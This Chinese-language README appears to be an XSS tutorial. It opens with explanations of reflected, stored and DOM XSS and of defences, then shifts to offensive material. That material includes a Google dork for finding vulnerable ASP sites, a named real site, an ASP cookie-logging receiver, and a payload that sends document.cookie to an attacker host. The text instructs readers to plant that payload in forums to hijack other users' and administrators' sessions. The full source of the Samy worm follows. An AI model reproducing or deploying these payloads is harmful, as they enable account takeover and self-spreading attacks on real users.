# xss-introduce
xss introduce
理解XSS的攻击手段和原理
掌握xss攻击的防范措施
了解XSS的定义
跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下：
“一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意脚本将访问浏览器中保存的cookie、会话token或其他的敏感信息，并利用这些信息来完成其他的恶意目的，而有些脚本甚至还可以修改页面的HTML代码。”


理解xss的原理（必备）
理解xss的攻击方式
掌握xss的防御措施

理解XSS攻击方式：
反射型：发出请求时，XSS代码出现在URL中（典型的特征，攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应（），XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程想一次反射，故叫反射型XSS
演示：构建Node应用，演示反射型XSS攻击

存储型：差别在于提交的代码会存储在服务器端（数据库，内存，服务系统等）下次请求页面时不用再提交XSS代码。
1)反射型XSS: 就如上面的例子，也就是黑客需要诱使用户点击链接。也叫作"非持久型XSS“(Non-persistent XSS)
2)存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。
比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做"存储型XSS"。
3)DOM based XSS:也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。
XSS脚本怎么进入服务端？
XSS防御措施：
编码：不能对用户所有输入保持原样
对用户输入的数据进行HTML Entity编码
 
过滤：把输入不合法的过滤掉，保持安全性
移除用户上传的DOM属性，如onerror，onclick等
移除用户上传的Style节点，script节点，iframe节点等
对于开发人员来说，首先需要注意的是应该对所有用户提交的内容执行坚如磐石输入验证。这包括网址，查 询字符串，header，POST 数据等所有用户提交的内容。只接受您所希望的字符，在您指定的长度内，和指定 的相应的数据的格式。组织，过滤，或忽略一切。 2. 保护被自动执行或来自第三方网站执行的所有敏感功能。在适当的情况使用会话令牌 27、验证码 28系统或者 HTTP 引用头检查。 3. 如果您的网站必须支持用户提供的 HTML，那么你是处在一个安全明智的下滑坡。然而，也有一些事情可以 做，来保护您的网站。请确保您收到的 HTML 内容是良好的，只包含最少的一组安全标签（绝对没有 JavaScript）， 没有包含任何引用远程的内容（尤其是样式表和 JavaScript）。而且，为了多一点的安全性，请将 httpOnly29添 加到您的 cookie

校正：破坏了正常的页面结构，也是一种XSS攻击
避免直接都HTML Entity解码
使用DOM Parse（文本转成DOM结构）转换，校正不配对的DOM标签 

掌握XSS的防御措施
实战：
构建Node服务和建立一个评论，实例演示XSS的攻击预防


Xss攻击常见测试语句
<scrtpt>alert(‘test’)</script>
<svg onload=alert(‘test’)>


http://www.ocelltech.com/en/so.asp
search：inurl:'Product.asp?BigClassName'//google
中华网
*/><script>alert(1)</script>
把alert里面的内容换成document.cookie就可以
*/><script>alert(document.cookie)</script>
一般的做法是<html>
<title>xx</title>
<body>
<%testfile = Server.MapPath("code.txt") //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中
msg = Request("msg")   //获取提交过来的msg变量，也就是cookie值
set fs = server.CreateObject("scripting.filesystemobject")//创建一个fs对象
set thisfile = fs.OpenTextFile(testfile,8,True,0)
thisfile.WriteLine(""&msg&"")//像code.txt中写入获取来的cookie
thisfile.close()   //关闭
set fs = nothing%>
</body>
</html>




把上述文件保存为cookie.asp文件，放到你自己的网站服务器下。比如这里我们自己搭建的服务器为：http://10.65.20.196:8080。 
XSS构造语句
<script>window.open('http://10.65.20.196:8080/cookie.asp?msg='+document.cookie)</script>
把上述语句放到你找到的存在XSS的目标中，不过这里最好是存储型xss，比如你找到了某个博客或者论坛什么的存在存储型XSS，你在里面发一篇帖子或者留上你的评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到http://10.65.20.196:8080/cookie.asp?msg=’+document.cookie的页面，然后当前账户的coolie信息就当成参数发到你的网站下的文件里了。然后的然后你就可以那这个cookie登陆了


Samy蠕虫源码
1.<div id=mycode style="BACKGROUND:url('java  
2.script:eval(document.all.mycode.expr)')"expr="var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g(){varC;try{varD=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return 
3.C}else{return eval('document.body.inne'+'rHTML')}}function 
4.getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){varE=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(varO=0;O<F.length;O++){varI=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}functiongetClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}functionparamsToString(AV){var N=new 
5.String();var O=0;for(var P 
6.in AV){if(O>0){N+='&'}varQ=escape(AV[P]);while(Q.indexOf('+')!=-1){QQ=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){QQ=Q.replace('&','%26')}N+=P+'='+Q;O++}return 
7.N}function httpSend(BH,BI,BJ,BK){if(!J){return 
8.false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return 
9.true}function findIn(BF,BB,BC){varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))}functiongetHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else 
10.if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=newActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return 
11.Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE){AEAE=AE.replace('jav'+'a',A+'jav'+'a');AEAE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' 
12.but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function getHome(){if(J.readyState!=4){return}varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AGAG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var 
13.AR=getFromURL(AU,'Mytoken');var 
14.AS=new 
15.Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&MytokenMytoken='+AR,postHero,'POST',paramsToString(AS))}}}functionpostHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var 
16.AS=new 
17.Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function 
18.main(){var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&MytokenMytoken='+L,processxForm,'GET')}functionprocessxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var 
19.AS=new 
20.Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to 
21.Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function 
22.httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return 
23.false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return 
24.true}"></DIV> 
